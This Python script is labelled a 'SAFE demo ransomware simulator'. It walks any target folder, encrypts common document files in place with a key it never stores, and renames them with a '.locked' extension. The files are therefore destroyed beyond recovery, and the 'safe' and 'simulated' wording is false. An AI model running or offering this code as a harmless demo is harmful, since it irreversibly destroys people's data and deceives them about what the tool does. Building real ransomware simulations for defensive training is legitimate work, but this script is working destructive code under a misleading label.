from __future__ import annotations

import argparse
from pathlib import Path
from cryptography.fernet import Fernet


SAFE_EXTENSIONS = {".txt", ".pdf", ".docx", ".xlsx"}


def main() -> None:
    parser = argparse.ArgumentParser(description="SAFE demo ransomware simulator (folder-scoped)")
    parser.add_argument("--target", required=True)
    parser.add_argument("--extension", default=".locked")
    args = parser.parse_args()

    target = Path(args.target)
    key = Fernet.generate_key()
    cipher = Fernet(key)

    count = 0
    for p in target.rglob("*"):
        if p.is_file() and p.suffix.lower() in SAFE_EXTENSIONS:
            raw = p.read_bytes()
            encrypted = cipher.encrypt(raw)
            p.write_bytes(encrypted)
            p.rename(p.with_suffix(p.suffix + args.extension))
            count += 1
    print(f"simulated encryption for {count} files in {target}")


if __name__ == "__main__":
    main()
